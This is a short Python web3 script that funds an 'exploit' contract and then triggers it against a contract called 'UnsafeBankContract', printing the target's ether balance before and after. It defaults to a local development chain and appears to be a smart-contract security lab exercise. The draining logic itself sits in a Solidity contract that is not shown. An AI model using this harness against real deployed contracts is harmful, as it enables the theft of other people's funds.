from web3 import Web3
import random
import click

abi = [
    {
      "inputs": [],
      "name": "addFunds",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": True
    },
    {
      "inputs": [],
      "name": "exploit",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
]

def get_web3(url):
    return Web3(Web3.HTTPProvider(url))

def exploit(contract_address, owner, url):
    web3 = get_web3(url)
    contract = web3.eth.contract(address=contract_address, abi=abi)
  
    value = web3.toWei(2, "ether")

    balance = web3.eth.getBalance(contract_address)
    print("Balance {}".format(web3.fromWei(balance, "ether")))

    tx_hash_addfunds = contract.functions.addFunds().transact({
        "from": owner,
        "value": value
    })

    tx_hash_exploit = contract.functions.exploit().transact({
        "from": owner
    })

    web3.eth.waitForTransactionReceipt(tx_hash_addfunds)
    web3.eth.waitForTransactionReceipt(tx_hash_exploit)

    print("The exploit was executed")
    balance = web3.eth.getBalance(contract_address)
    print("Balance {}".format(web3.fromWei(balance, "ether")))


@click.command()
@click.option('--contract-address', prompt='Write the contract address', help='Contract address to populate')
@click.option('--owner', prompt='Owner of the exploit contract', help='Owner of the exploit contract')
@click.option('--url', prompt=False, help='Url of the blockchain', default="http://localhost:7545")
def exploit_contract(contract_address, owner, url):
    """Script to exploit the contract 'UnsafeBankContract' with a large amount of Ether"""
    exploit(contract_address, owner, url)

if __name__ == '__main__':
    exploit_contract()